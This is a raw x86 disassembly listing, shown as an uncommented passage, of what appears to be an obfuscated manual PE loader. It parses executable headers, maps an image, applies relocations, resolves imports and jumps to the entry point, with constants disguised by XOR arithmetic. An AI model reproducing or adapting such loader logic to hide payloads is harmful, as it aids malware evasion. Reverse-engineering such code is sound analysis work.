  41e205:	mov    esi,DWORD PTR [ebp-0x4]
  41e208:	mov    eax,0xf881ba0f
  41e20d:	mov    DWORD PTR [esi],eax
  41e20f:	mov    esi,DWORD PTR [ebp-0x8]
  41e212:	cmp    esi,eax
  41e214:	pop    esi
  41e215:	jne    0x41e21f
  41e217:	mov    BYTE PTR [ecx+0xa],0x7c
  41e21b:	mov    BYTE PTR [edx+0x8],0x2f
  41e21f:	mov    BYTE PTR [edx+0xa],0x7c
  41e223:	mov    BYTE PTR [ecx+0x2],0x2
  41e227:	leave  
  41e228:	ret    
  41e229:	push   ebp
  41e22a:	mov    ebp,esp
  41e22c:	push   ecx
  41e22d:	push   ecx
  41e22e:	lea    eax,[ebp-0x8]
  41e231:	mov    DWORD PTR [ebp-0x4],eax
  41e234:	mov    edx,DWORD PTR [ebp-0x4]
  41e237:	mov    eax,0xf88b0be3
  41e23c:	mov    DWORD PTR [edx],eax
  41e23e:	mov    edx,DWORD PTR [ebp-0x8]
  41e241:	cmp    edx,eax
  41e243:	jne    0x41e254
  41e245:	mov    eax,DWORD PTR [ebp+0x8]
  41e248:	mov    BYTE PTR [ecx+0x9],0x8
  41e24c:	mov    BYTE PTR [eax+0x7],0x47
  41e250:	mov    BYTE PTR [ecx+0x6],0xf
  41e254:	mov    BYTE PTR [ecx+0x3],0x18
  41e258:	leave  
  41e259:	ret    0x4
  41e25c:	push   ebp
  41e25d:	mov    ebp,esp
  41e25f:	push   ecx
  41e260:	push   ecx
  41e261:	lea    eax,[ebp-0x8]
  41e264:	mov    DWORD PTR [ebp-0x4],eax
  41e267:	mov    edx,DWORD PTR [ebp-0x4]
  41e26a:	mov    eax,0x7e0da0f
  41e26f:	mov    DWORD PTR [edx],eax
  41e271:	mov    edx,DWORD PTR [ebp-0x8]
  41e274:	cmp    edx,eax
  41e276:	jne    0x41e27c
  41e278:	mov    BYTE PTR [ecx+0x7],0x47
  41e27c:	mov    eax,DWORD PTR [ebp+0x8]
  41e27f:	mov    BYTE PTR [ecx+0x1],0x5
  41e283:	mov    BYTE PTR [eax+0x9],0x28
  41e287:	leave  
  41e288:	ret    0x4
  41e28b:	push   ebp
  41e28c:	mov    ebp,esp
  41e28e:	push   ecx
  41e28f:	push   ecx
  41e290:	lea    eax,[ebp-0x8]
  41e293:	mov    DWORD PTR [ebp-0x4],eax
  41e296:	push   esi
  41e297:	mov    esi,DWORD PTR [ebp-0x4]
  41e29a:	mov    eax,0x7060e3e
  41e29f:	mov    DWORD PTR [esi],eax
  41e2a1:	mov    esi,DWORD PTR [ebp-0x8]
  41e2a4:	cmp    esi,eax
  41e2a6:	pop    esi
  41e2a7:	jne    0x41e2b3
  41e2a9:	mov    BYTE PTR [edx+0x4],0x3
  41e2ad:	mov    WORD PTR [ecx+0x3],0x318
  41e2b3:	mov    BYTE PTR [edx],0x3f
  41e2b6:	leave  
  41e2b7:	ret    
  41e2b8:	push   ebp
  41e2b9:	mov    ebp,esp
  41e2bb:	push   ecx
  41e2bc:	push   ecx
  41e2bd:	lea    eax,[ebp-0x8]
  41e2c0:	mov    DWORD PTR [ebp-0x4],eax
  41e2c3:	mov    edx,DWORD PTR [ebp-0x4]
  41e2c6:	mov    eax,0xf8870b3f
  41e2cb:	mov    DWORD PTR [edx],eax
  41e2cd:	mov    edx,DWORD PTR [ebp-0x8]
  41e2d0:	cmp    edx,eax
  41e2d2:	jne    0x41e2df
  41e2d4:	mov    eax,DWORD PTR [ebp+0x8]
  41e2d7:	mov    BYTE PTR [ecx+0x8],0xf
  41e2db:	mov    BYTE PTR [eax+0x1],0x5
  41e2df:	mov    BYTE PTR [ecx+0x5],0xb
  41e2e3:	leave  
  41e2e4:	ret    0x4
  41e2e7:	push   esi
  41e2e8:	mov    ecx,edi
  41e2ea:	call   0x41e2b8
  41e2ef:	mov    edx,edi
  41e2f1:	mov    ecx,esi
  41e2f3:	mov    BYTE PTR [esi],0x1f
  41e2f6:	call   0x41e28b
  41e2fb:	push   esi
  41e2fc:	mov    ecx,edi
  41e2fe:	mov    BYTE PTR [esi+0x5],0xb
  41e302:	call   0x41e25c
  41e307:	push   esi
  41e308:	mov    BYTE PTR [esi+0x6],0xf
  41e30c:	call   0x41e229
  41e311:	mov    BYTE PTR [esi+0x2],0x2
  41e315:	mov    edx,esi
  41e317:	jmp    0x41e1f9
  41e31c:	push   ebp
  41e31d:	mov    ebp,esp
  41e31f:	push   ecx
  41e320:	mov    ecx,DWORD PTR [edx+0x194]
  41e326:	push   esi
  41e327:	mov    esi,DWORD PTR [ebp+0x8]
  41e32a:	mov    esi,DWORD PTR [esi]
  41e32c:	mov    DWORD PTR [ecx],esi
  41e32e:	mov    ecx,DWORD PTR [edx+0x194]
  41e334:	mov    ecx,DWORD PTR [ecx]
  41e336:	mov    esi,DWORD PTR [edx+0x190]
  41e33c:	mov    DWORD PTR [esi],ecx
  41e33e:	mov    eax,DWORD PTR [edx+0x194]
  41e344:	mov    ecx,DWORD PTR [eax]
  41e346:	mov    ecx,DWORD PTR [ecx+0x3c]
  41e349:	add    ecx,DWORD PTR [eax]
  41e34b:	mov    DWORD PTR [ebp-0x4],0xf89ca585
  41e352:	mov    eax,DWORD PTR [ebp-0x4]
  41e355:	movzx  ecx,WORD PTR [ecx+0x16]
  41e359:	xor    eax,0x751089b
  41e35e:	add    eax,0x3272e2
  41e363:	pop    esi
  41e364:	test   ecx,eax
  41e366:	je     0x41e374
  41e368:	mov    eax,DWORD PTR [edx+0x1c8]
  41e36e:	mov    DWORD PTR [eax],0xf89c8584
  41e374:	leave  
  41e375:	ret    0x4
  41e378:	push   ebp
  41e379:	mov    ebp,esp
  41e37b:	sub    esp,0x70
  41e37e:	and    DWORD PTR [ebp-0x20],0x0
  41e382:	mov    DWORD PTR [ebp-0x18],0xf89cb585
  41e389:	mov    DWORD PTR [ebp-0x1c],0xf89c85c5
  41e390:	mov    DWORD PTR [ebp-0x2c],0xf89c85b9
  41e397:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  41e39e:	mov    DWORD PTR [ebp-0x2c],0xf89f0585
  41e3a5:	mov    eax,DWORD PTR [ebp+0x20]
  41e3a8:	mov    eax,DWORD PTR [eax+0x194]
  41e3ae:	mov    DWORD PTR [ebp-0xc],eax
  41e3b1:	mov    eax,DWORD PTR [ebp+0x20]
  41e3b4:	push   ebx
  41e3b5:	push   esi
  41e3b6:	mov    esi,DWORD PTR [eax+0x190]
  41e3bc:	mov    eax,DWORD PTR [ebp+0x20]
  41e3bf:	mov    eax,DWORD PTR [eax+0x18c]
  41e3c5:	mov    DWORD PTR [ebp-0x8],eax
  41e3c8:	mov    eax,DWORD PTR [eax]
  41e3ca:	push   edi
  41e3cb:	mov    DWORD PTR [ebp-0x4],esi
  41e3ce:	test   eax,eax
  41e3d0:	jne    0x41e3dd
  41e3d2:	push   DWORD PTR [ebp+0x1c]
  41e3d5:	mov    edx,DWORD PTR [ebp+0x20]
  41e3d8:	call   0x41e31c
  41e3dd:	mov    eax,DWORD PTR [esi]
  41e3df:	mov    ebx,DWORD PTR [esi]
  41e3e1:	add    ebx,DWORD PTR [eax+0x3c]
  41e3e4:	mov    eax,DWORD PTR [ebp+0xc]
  41e3e7:	mov    ecx,DWORD PTR [ebp-0x8]
  41e3ea:	mov    ecx,DWORD PTR [ecx]
  41e3ec:	mov    esi,0x751089b
  41e3f1:	xor    eax,esi
  41e3f3:	mov    edi,0x3272e2
  41e3f8:	add    eax,edi
  41e3fa:	cmp    eax,ecx
  41e3fc:	jne    0x41e634
  41e402:	mov    eax,DWORD PTR [ebp-0xc]
  41e405:	mov    eax,DWORD PTR [eax]
  41e407:	mov    DWORD PTR [ebp-0x10],eax
  41e40a:	mov    eax,DWORD PTR [ebx+0x50]
  41e40d:	mov    DWORD PTR [ebp-0x68],eax
  41e410:	mov    eax,DWORD PTR [ebp-0x18]
  41e413:	xor    eax,esi
  41e415:	add    eax,edi
  41e417:	mov    DWORD PTR [ebp-0x64],eax
  41e41a:	mov    eax,DWORD PTR [ebp-0x14]
  41e41d:	and    DWORD PTR [ebp-0x6c],0x0
  41e421:	xor    eax,esi
  41e423:	add    eax,edi
  41e425:	mov    DWORD PTR [ebp-0x60],eax
  41e428:	lea    eax,[ebp-0x70]
  41e42b:	push   eax
  41e42c:	mov    eax,DWORD PTR [ebp+0x8]
  41e42f:	xor    eax,esi
  41e431:	add    eax,edi
  41e433:	push   eax
  41e434:	mov    eax,DWORD PTR [ebp+0x20]
  41e437:	add    eax,0xaa
  41e43c:	push   eax
  41e43d:	mov    eax,DWORD PTR [ebp+0x20]
  41e440:	mov    eax,DWORD PTR [eax+0x198]
  41e446:	mov    DWORD PTR [ebp-0x70],0x4
  41e44d:	push   DWORD PTR [eax]
  41e44f:	mov    eax,DWORD PTR [ebp+0x10]
  41e452:	call   eax
  41e454:	mov    ecx,DWORD PTR [ebp-0xc]
  41e457:	mov    ecx,DWORD PTR [ecx]
  41e459:	mov    edx,DWORD PTR [ebp-0x8]
  41e45c:	mov    DWORD PTR [ebp-0x6c],eax
  41e45f:	mov    DWORD PTR [ebp+0x1c],eax
  41e462:	mov    DWORD PTR [edx],ecx
  41e464:	mov    ecx,DWORD PTR [ebp-0x4]
  41e467:	mov    DWORD PTR [ecx],eax
  41e469:	mov    eax,DWORD PTR [ebx+0x50]
  41e46c:	mov    DWORD PTR [ebp-0x68],eax
  41e46f:	mov    eax,DWORD PTR [ebp-0x1c]
  41e472:	xor    eax,esi
  41e474:	add    eax,edi
  41e476:	mov    DWORD PTR [ebp-0x64],eax
  41e479:	lea    eax,[ebp-0x20]
  41e47c:	mov    DWORD PTR [ebp-0x60],eax
  41e47f:	lea    eax,[ebp-0x70]
  41e482:	push   eax
  41e483:	mov    eax,DWORD PTR [ebp+0x8]
  41e486:	xor    eax,esi
  41e488:	add    eax,edi
  41e48a:	push   eax
  41e48b:	mov    eax,DWORD PTR [ebp+0x20]
  41e48e:	add    eax,0xee
  41e493:	push   eax
  41e494:	mov    eax,DWORD PTR [ebp+0x20]
  41e497:	mov    eax,DWORD PTR [eax+0x198]
  41e49d:	mov    DWORD PTR [ebp-0x70],0x4
  41e4a4:	push   DWORD PTR [eax]
  41e4a6:	mov    eax,DWORD PTR [ebp+0x10]
  41e4a9:	call   eax
  41e4ab:	test   eax,eax
  41e4ad:	je     0x41e4d2
  41e4af:	and    DWORD PTR [ebp+0xc],0x0
  41e4b3:	cmp    DWORD PTR [ebx+0x50],0x0
  41e4b7:	jbe    0x41e4d2
  41e4b9:	mov    eax,DWORD PTR [ebp+0x1c]
  41e4bc:	mov    ecx,DWORD PTR [ebp-0x10]
  41e4bf:	sub    ecx,eax
  41e4c1:	mov    dl,BYTE PTR [ecx+eax*1]
  41e4c4:	inc    DWORD PTR [ebp+0xc]
  41e4c7:	mov    BYTE PTR [eax],dl
  41e4c9:	mov    edx,DWORD PTR [ebp+0xc]
  41e4cc:	inc    eax
  41e4cd:	cmp    edx,DWORD PTR [ebx+0x50]
  41e4d0:	jb     0x41e4c1
  41e4d2:	mov    edx,DWORD PTR [ebp+0x1c]
  41e4d5:	mov    ecx,DWORD PTR [edx+0x3c]
  41e4d8:	add    ecx,edx
  41e4da:	mov    eax,DWORD PTR [ecx+0xa0]
  41e4e0:	mov    ebx,DWORD PTR [ecx+0x28]
  41e4e3:	add    eax,edx
  41e4e5:	sub    edx,DWORD PTR [ebp-0x10]
  41e4e8:	add    ebx,DWORD PTR [ebp+0x1c]
  41e4eb:	mov    DWORD PTR [ebp+0xc],edx
  41e4ee:	mov    DWORD PTR [ebp-0x2c],ecx
  41e4f1:	mov    DWORD PTR [ebp-0x14],ebx
  41e4f4:	mov    DWORD PTR [ebp-0x8],0x0
  41e4fb:	jmp    0x41e577
  41e4fd:	add    edx,0xfffffff8
  41e500:	shr    edx,1
  41e502:	mov    DWORD PTR [ebp-0x18],edx
  41e505:	je     0x41e563
  41e507:	lea    edx,[eax+0x8]
  41e50a:	mov    DWORD PTR [ebp-0x4],edx
  41e50d:	mov    edx,DWORD PTR [ebp-0x18]
  41e510:	mov    DWORD PTR [ebp-0x18],edx
  41e513:	mov    edx,DWORD PTR [ebp-0x4]
  41e516:	movzx  edx,WORD PTR [edx]
  41e519:	mov    DWORD PTR [ebp-0x24],edx
  41e51c:	and    edx,0xfff
  41e522:	mov    DWORD PTR [ebp-0x28],edx
  41e525:	mov    edx,DWORD PTR [ebp-0x24]
  41e528:	shr    edx,0xc
  41e52b:	add    edx,0xffcd8d1e
  41e531:	xor    edx,esi
  41e533:	cmp    edx,0xf89c85ba
  41e539:	jne    0x41e55a
  41e53b:	mov    edx,DWORD PTR [ebp-0x28]
  41e53e:	add    edx,DWORD PTR [ebp+0x1c]
  41e541:	mov    ebx,DWORD PTR [eax]
  41e543:	cmp    DWORD PTR [ebx+edx*1],0x0
  41e547:	je     0x41e557
  41e549:	mov    ecx,DWORD PTR [ebp+0xc]
  41e54c:	add    ecx,DWORD PTR [ebx+edx*1]
  41e54f:	mov    ebx,DWORD PTR [eax]
  41e551:	mov    DWORD PTR [edx+ebx*1],ecx
  41e554:	mov    ecx,DWORD PTR [ebp-0x2c]
  41e557:	mov    ebx,DWORD PTR [ebp-0x14]
  41e55a:	add    DWORD PTR [ebp-0x4],0x2
  41e55e:	dec    DWORD PTR [ebp-0x18]
  41e561:	jne    0x41e513
  41e563:	mov    edx,DWORD PTR [ebp-0xc]
  41e566:	add    DWORD PTR [ebp-0x8],edx
  41e569:	mov    edx,DWORD PTR [ebp-0x8]
  41e56c:	cmp    edx,DWORD PTR [ecx+0xa4]
  41e572:	jae    0x41e585
  41e574:	add    eax,DWORD PTR [ebp-0xc]
  41e577:	mov    edx,DWORD PTR [eax+0x4]
  41e57a:	mov    DWORD PTR [ebp-0xc],edx
  41e57d:	test   edx,edx
  41e57f:	jne    0x41e4fd
  41e585:	mov    eax,DWORD PTR [ebp-0x10]
  41e588:	mov    DWORD PTR [ebp-0x6c],eax
  41e58b:	mov    DWORD PTR [ebp-0x70],0x4
  41e592:	mov    eax,DWORD PTR [ecx+0x50]
  41e595:	mov    DWORD PTR [ebp-0x68],eax
  41e598:	mov    eax,DWORD PTR [ebp-0x1c]
  41e59b:	xor    eax,esi
  41e59d:	add    eax,edi
  41e59f:	mov    DWORD PTR [ebp-0x64],eax
  41e5a2:	lea    eax,[ebp-0x20]
  41e5a5:	mov    DWORD PTR [ebp-0x60],eax
  41e5a8:	lea    eax,[ebp-0x70]
  41e5ab:	push   eax
  41e5ac:	mov    eax,DWORD PTR [ebp+0x8]
  41e5af:	xor    eax,esi
  41e5b1:	add    eax,edi
  41e5b3:	push   eax
  41e5b4:	mov    eax,DWORD PTR [ebp+0x20]
  41e5b7:	add    eax,0xee
  41e5bc:	push   eax
  41e5bd:	mov    eax,DWORD PTR [ebp+0x20]
  41e5c0:	mov    eax,DWORD PTR [eax+0x198]
  41e5c6:	push   DWORD PTR [eax]
  41e5c8:	mov    eax,DWORD PTR [ebp+0x10]
  41e5cb:	call   eax
  41e5cd:	mov    eax,DWORD PTR [ebp+0x20]
  41e5d0:	mov    eax,DWORD PTR [eax+0x180]
  41e5d6:	add    eax,DWORD PTR [ebp+0xc]
  41e5d9:	mov    ecx,DWORD PTR [ebp+0xc]
  41e5dc:	push   DWORD PTR [ebp+0x18]
  41e5df:	mov    DWORD PTR [eax],ecx
  41e5e1:	push   DWORD PTR [ebp+0x14]
  41e5e4:	push   DWORD PTR [ebp+0x1c]
  41e5e7:	call   ebx
  41e5e9:	mov    ecx,DWORD PTR [ebp+0xc]
  41e5ec:	add    ecx,DWORD PTR [ebp+0x20]
  41e5ef:	lea    eax,[ebp+0x4]
  41e5f2:	mov    DWORD PTR [ebp+0x20],ecx
  41e5f5:	mov    ecx,DWORD PTR [ebp+0x20]
  41e5f8:	mov    ecx,DWORD PTR [ebp+0x20]
  41e5fb:	mov    edx,DWORD PTR [ecx+0x190]
  41e601:	mov    ecx,DWORD PTR [ebp+0x20]
  41e604:	mov    ecx,DWORD PTR [ecx+0x18c]
  41e60a:	mov    esi,DWORD PTR [ecx]
  41e60c:	cmp    DWORD PTR [eax],esi
  41e60e:	jb     0x41e62f
  41e610:	mov    esi,DWORD PTR [edx]
  41e612:	mov    edi,DWORD PTR [edx]
  41e614:	mov    esi,DWORD PTR [esi+0x3c]
  41e617:	lea    esi,[edi+esi*1+0x50]
  41e61b:	mov    edi,DWORD PTR [ecx]
  41e61d:	add    edi,DWORD PTR [esi]
  41e61f:	cmp    DWORD PTR [eax],edi
  41e621:	jae    0x41e62f
  41e623:	mov    esi,DWORD PTR [ecx]
  41e625:	mov    ecx,DWORD PTR [eax]
  41e627:	mov    edx,DWORD PTR [edx]
  41e629:	sub    ecx,esi
  41e62b:	add    edx,ecx
  41e62d:	mov    DWORD PTR [eax],edx
  41e62f:	mov    eax,DWORD PTR [ebp+0xc]
  41e632:	jmp    0x41e636
  41e634:	xor    eax,eax
  41e636:	pop    edi
  41e637:	pop    esi
  41e638:	pop    ebx
  41e639:	leave  
  41e63a:	ret    0x1c
  41e63d:	push   ebp
  41e63e:	mov    ebp,esp
  41e640:	sub    esp,0x1c
  41e643:	push   esi
  41e644:	mov    esi,eax
  41e646:	mov    eax,DWORD PTR [ecx+0x190]
  41e64c:	cmp    DWORD PTR [eax],0x0
  41e64f:	je     0x41e75f
  41e655:	test   edx,edx
  41e657:	je     0x41e75f
  41e65d:	test   esi,esi
  41e65f:	je     0x41e75f
  41e665:	mov    eax,DWORD PTR [esi+0x88]
  41e66b:	test   eax,eax
  41e66d:	je     0x41e75a
  41e673:	cmp    DWORD PTR [esi+0x8c],0x10
  41e67a:	je     0x41e75a
  41e680:	cmp    DWORD PTR [esi+0x34],edx
  41e683:	je     0x41e75a
  41e689:	mov    esi,DWORD PTR [ecx+0x18c]
  41e68f:	and    DWORD PTR [ebp-0x10],0x0
  41e693:	mov    ecx,edx
  41e695:	sub    ecx,DWORD PTR [esi]
  41e697:	add    eax,edx
  41e699:	movzx  edx,WORD PTR [eax+0xc]
  41e69d:	mov    DWORD PTR [ebp-0x1c],ecx
  41e6a0:	movzx  ecx,WORD PTR [eax+0xe]
  41e6a4:	add    ecx,edx
  41e6a6:	je     0x41e75a
  41e6ac:	lea    ecx,[eax+0x14]
  41e6af:	push   ebx
  41e6b0:	mov    DWORD PTR [ebp-0x18],ecx
  41e6b3:	mov    esi,0x7fffffff
  41e6b8:	push   edi
  41e6b9:	test   DWORD PTR [ecx],esi
  41e6bb:	je     0x41e73c
  41e6bd:	mov    edx,DWORD PTR [ecx]
  41e6bf:	and    DWORD PTR [ebp-0xc],0x0
  41e6c3:	and    edx,esi
  41e6c5:	add    edx,eax
  41e6c7:	movzx  edi,WORD PTR [edx+0xe]
  41e6cb:	movzx  ebx,WORD PTR [edx+0xc]
  41e6cf:	add    edi,ebx
  41e6d1:	je     0x41e73c
  41e6d3:	lea    ecx,[edx+0x14]
  41e6d6:	mov    DWORD PTR [ebp-0x14],ecx
  41e6d9:	test   DWORD PTR [ecx],esi
  41e6db:	je     0x41e71e
  41e6dd:	mov    ecx,DWORD PTR [ecx]
  41e6df:	and    DWORD PTR [ebp-0x8],0x0
  41e6e3:	and    ecx,esi
  41e6e5:	add    ecx,eax
  41e6e7:	movzx  edi,WORD PTR [ecx+0xe]
  41e6eb:	movzx  ebx,WORD PTR [ecx+0xc]
  41e6ef:	add    edi,ebx
  41e6f1:	je     0x41e71e
  41e6f3:	lea    edi,[ecx+0x14]
  41e6f6:	mov    DWORD PTR [ebp-0x4],edi
  41e6f9:	mov    edi,DWORD PTR [ebp-0x4]
  41e6fc:	mov    edi,DWORD PTR [edi]
  41e6fe:	test   edi,edi
  41e700:	je     0x41e708
  41e702:	mov    ebx,DWORD PTR [ebp-0x1c]
  41e705:	add    DWORD PTR [edi+eax*1],ebx
  41e708:	movzx  edi,WORD PTR [ecx+0xe]
  41e70c:	movzx  ebx,WORD PTR [ecx+0xc]
  41e710:	inc    DWORD PTR [ebp-0x8]
  41e713:	add    DWORD PTR [ebp-0x4],0x8
  41e717:	add    edi,ebx
  41e719:	cmp    DWORD PTR [ebp-0x8],edi
  41e71c:	jb     0x41e6f9
  41e71e:	movzx  edi,WORD PTR [edx+0xe]
  41e722:	movzx  ebx,WORD PTR [edx+0xc]
  41e726:	mov    ecx,DWORD PTR [ebp-0x14]
  41e729:	inc    DWORD PTR [ebp-0xc]
  41e72c:	add    ecx,0x8
  41e72f:	add    edi,ebx
  41e731:	mov    DWORD PTR [ebp-0x14],ecx
  41e734:	cmp    DWORD PTR [ebp-0xc],edi
  41e737:	jb     0x41e6d9
  41e739:	mov    ecx,DWORD PTR [ebp-0x18]
  41e73c:	movzx  edx,WORD PTR [eax+0xe]
  41e740:	movzx  edi,WORD PTR [eax+0xc]
  41e744:	inc    DWORD PTR [ebp-0x10]
  41e747:	add    ecx,0x8
  41e74a:	add    edx,edi
  41e74c:	mov    DWORD PTR [ebp-0x18],ecx
  41e74f:	cmp    DWORD PTR [ebp-0x10],edx
  41e752:	jb     0x41e6b9
  41e758:	pop    edi
  41e759:	pop    ebx
  41e75a:	xor    eax,eax
  41e75c:	inc    eax
  41e75d:	jmp    0x41e761
  41e75f:	xor    eax,eax
  41e761:	pop    esi
  41e762:	leave  
  41e763:	ret    
  41e764:	push   ebp
  41e765:	mov    ebp,esp
  41e767:	mov    ecx,DWORD PTR [ecx+0x190]
  41e76d:	mov    eax,DWORD PTR [ebp+0xc]
  41e770:	sub    esp,0x10
  41e773:	push   ebx
  41e774:	xor    ebx,ebx
  41e776:	push   esi
  41e777:	push   edi
  41e778:	cmp    DWORD PTR [ecx],ebx
  41e77a:	je     0x41e802
  41e780:	cmp    eax,ebx
  41e782:	je     0x41e802
  41e784:	cmp    DWORD PTR [eax+0x78],ebx
  41e787:	jne    0x41e78e
  41e789:	xor    eax,eax
  41e78b:	inc    eax
  41e78c:	jmp    0x41e804
  41e78e:	mov    eax,DWORD PTR [eax+0x78]
  41e791:	add    eax,DWORD PTR [ebp+0x8]
  41e794:	mov    ecx,DWORD PTR [eax+0x1c]
  41e797:	mov    edx,DWORD PTR [eax+0x24]
  41e79a:	mov    esi,DWORD PTR [eax+0x14]
  41e79d:	mov    edi,DWORD PTR [eax+0x18]
  41e7a0:	add    ecx,DWORD PTR [ebp+0x8]
  41e7a3:	add    edx,DWORD PTR [ebp+0x8]
  41e7a6:	mov    DWORD PTR [ebp-0x4],esi
  41e7a9:	cmp    esi,edi
  41e7ab:	ja     0x41e7b0
  41e7ad:	mov    DWORD PTR [ebp-0x4],edi
  41e7b0:	mov    DWORD PTR [ebp-0x8],ebx
  41e7b3:	cmp    DWORD PTR [ebp-0x4],ebx
  41e7b6:	jbe    0x41e789
  41e7b8:	cmp    ebx,DWORD PTR [eax+0x14]
  41e7bb:	jae    0x41e7c3
  41e7bd:	movzx  esi,WORD PTR [edx+ebx*2]
  41e7c1:	jmp    0x41e7c5
  41e7c3:	mov    esi,ebx
  41e7c5:	lea    esi,[ecx+esi*4]
  41e7c8:	mov    edi,DWORD PTR [esi]
  41e7ca:	test   edi,edi
  41e7cc:	je     0x41e7f7
  41e7ce:	add    edi,DWORD PTR [ebp+0x8]
  41e7d1:	mov    DWORD PTR [ebp-0x10],edi
  41e7d4:	cmp    edi,eax
  41e7d6:	jbe    0x41e7e8
  41e7d8:	mov    ebx,DWORD PTR [ebp+0xc]
  41e7db:	mov    ebx,DWORD PTR [ebx+0x7c]
  41e7de:	add    ebx,eax
  41e7e0:	cmp    edi,ebx
  41e7e2:	jae    0x41e7e8
  41e7e4:	mov    esi,DWORD PTR [esi]
  41e7e6:	jmp    0x41e7f0
  41e7e8:	sub    edi,DWORD PTR [ebp+0x8]
  41e7eb:	mov    DWORD PTR [esi],edi
  41e7ed:	mov    esi,DWORD PTR [ebp-0x10]
  41e7f0:	test   esi,esi
  41e7f2:	je     0x41e802
  41e7f4:	mov    ebx,DWORD PTR [ebp-0x8]
  41e7f7:	inc    ebx
  41e7f8:	mov    DWORD PTR [ebp-0x8],ebx
  41e7fb:	cmp    ebx,DWORD PTR [ebp-0x4]
  41e7fe:	jb     0x41e7b8
  41e800:	jmp    0x41e789
  41e802:	xor    eax,eax
  41e804:	pop    edi
  41e805:	pop    esi
  41e806:	pop    ebx
  41e807:	leave  
  41e808:	ret    0x8
  41e80b:	push   ebp
  41e80c:	mov    ebp,esp
  41e80e:	sub    esp,0x2c
  41e811:	mov    edx,0xf89c8585
  41e816:	mov    DWORD PTR [ebp-0x4],edx
  41e819:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  41e820:	mov    eax,DWORD PTR [ebp-0x4]
  41e823:	mov    ecx,DWORD PTR [ebp-0x4]
  41e826:	mov    ecx,DWORD PTR [ebp-0x4]
  41e829:	mov    ecx,DWORD PTR [ebp-0x4]
  41e82c:	mov    ecx,DWORD PTR [ebp-0x4]
  41e82f:	mov    ecx,DWORD PTR [ebp-0x4]
  41e832:	push   ebx
  41e833:	mov    ebx,DWORD PTR [ebp+0x10]
  41e836:	push   esi
  41e837:	mov    esi,0x751089b
  41e83c:	mov    DWORD PTR [ebp-0x10],0x352eb0f
  41e843:	mov    ecx,DWORD PTR [ebp-0x4]
  41e846:	mov    ebx,DWORD PTR [ebx+0x190]
  41e84c:	push   edi
  41e84d:	mov    edi,0x3272e2
  41e852:	xor    ecx,esi
  41e854:	xor    eax,esi
  41e856:	add    eax,edi
  41e858:	add    ecx,edi
  41e85a:	mov    DWORD PTR [ebp-0x18],eax
  41e85d:	cmp    ecx,DWORD PTR [ebx]
  41e85f:	je     0x41eae0
  41e865:	mov    ebx,DWORD PTR [ebp-0x4]
  41e868:	mov    ecx,DWORD PTR [ebp+0xc]
  41e86b:	xor    ebx,esi
  41e86d:	add    ebx,edi
  41e86f:	cmp    ebx,ecx
  41e871:	je     0x41eae0
  41e877:	mov    ebx,DWORD PTR [ebp-0x4]
  41e87a:	mov    ecx,DWORD PTR [ecx+0x80]
  41e880:	xor    ebx,esi
  41e882:	add    ebx,edi
  41e884:	cmp    ecx,ebx
  41e886:	je     0x41eadb
  41e88c:	add    ecx,DWORD PTR [ebp+0x8]
  41e88f:	mov    DWORD PTR [ebp-0x2c],ecx
  41e892:	mov    ebx,edx
  41e894:	xor    ebx,esi
  41e896:	add    ebx,edi
  41e898:	mov    DWORD PTR [ebp-0x10],ebx
  41e89b:	mov    ebx,DWORD PTR [ebp-0x10]
  41e89e:	cmp    ebx,edx
  41e8a0:	je     0x41e8b4
  41e8a2:	mov    edx,DWORD PTR [ebp-0x10]
  41e8a5:	mov    ebx,DWORD PTR [ebp-0x4]
  41e8a8:	imul   edx,edx,0x14
  41e8ab:	xor    ebx,esi
  41e8ad:	add    ebx,edi
  41e8af:	cmp    DWORD PTR [edx+ecx*1],ebx
  41e8b2:	jne    0x41e8cb
  41e8b4:	mov    edx,DWORD PTR [ebp-0x10]
  41e8b7:	mov    ebx,DWORD PTR [ebp-0x4]
  41e8ba:	imul   edx,edx,0x14
  41e8bd:	xor    ebx,esi
  41e8bf:	add    ebx,edi
  41e8c1:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  41e8c5:	je     0x41eacd
  41e8cb:	mov    eax,DWORD PTR [ebp-0x4]
  41e8ce:	mov    ebx,DWORD PTR [ebp-0x4]
  41e8d1:	mov    eax,DWORD PTR [ebp-0x10]
  41e8d4:	imul   eax,eax,0x14
  41e8d7:	add    eax,ecx
  41e8d9:	mov    ecx,DWORD PTR [eax+0x10]
  41e8dc:	add    ecx,DWORD PTR [ebp+0x8]
  41e8df:	xor    ebx,esi
  41e8e1:	mov    DWORD PTR [ebp-0x1c],ecx
  41e8e4:	mov    ecx,DWORD PTR [ebp-0x4]
  41e8e7:	mov    edx,DWORD PTR [ebp-0x4]
  41e8ea:	xor    ecx,esi
  41e8ec:	add    ecx,edi
  41e8ee:	xor    edx,esi
  41e8f0:	mov    DWORD PTR [ebp-0x24],ecx
  41e8f3:	mov    ecx,DWORD PTR [eax]
  41e8f5:	add    edx,edi
  41e8f7:	add    ebx,edi
  41e8f9:	cmp    ecx,edx
  41e8fb:	je     0x41e903
  41e8fd:	add    ecx,DWORD PTR [ebp+0x8]
  41e900:	mov    DWORD PTR [ebp-0x24],ecx
  41e903:	mov    ecx,DWORD PTR [ebp-0x4]
  41e906:	xor    ecx,esi
  41e908:	add    ecx,DWORD PTR [eax+0xc]
  41e90b:	mov    eax,DWORD PTR [ebp+0x8]
  41e90e:	lea    eax,[ecx+eax*1+0x3272e2]
  41e915:	mov    DWORD PTR [ebp+0xc],eax
  41e918:	mov    DWORD PTR [ebp-0x28],0xf89c85b8
  41e91f:	mov    eax,DWORD PTR [ebp+0x10]
  41e922:	push   DWORD PTR [ebp+0xc]
  41e925:	mov    eax,DWORD PTR [eax+0x1d8]
  41e92b:	call   DWORD PTR [eax]
  41e92d:	mov    ecx,DWORD PTR [ebp-0x4]
  41e930:	xor    ecx,esi
  41e932:	add    ecx,edi
  41e934:	mov    DWORD PTR [ebp-0xc],eax
  41e937:	cmp    ecx,eax
  41e939:	jne    0x41e94d
  41e93b:	mov    eax,DWORD PTR [ebp+0x10]
  41e93e:	push   DWORD PTR [ebp+0xc]
  41e941:	mov    eax,DWORD PTR [eax+0x1d8]
  41e947:	call   DWORD PTR [eax+0xc]
  41e94a:	mov    DWORD PTR [ebp-0xc],eax
  41e94d:	mov    DWORD PTR [ebp-0x20],0x7f661b0c
  41e954:	mov    DWORD PTR [ebp-0x20],0xf89c999c
  41e95b:	mov    eax,DWORD PTR [ebp-0x4]
  41e95e:	xor    eax,esi
  41e960:	add    eax,edi
  41e962:	cmp    eax,DWORD PTR [ebp-0xc]
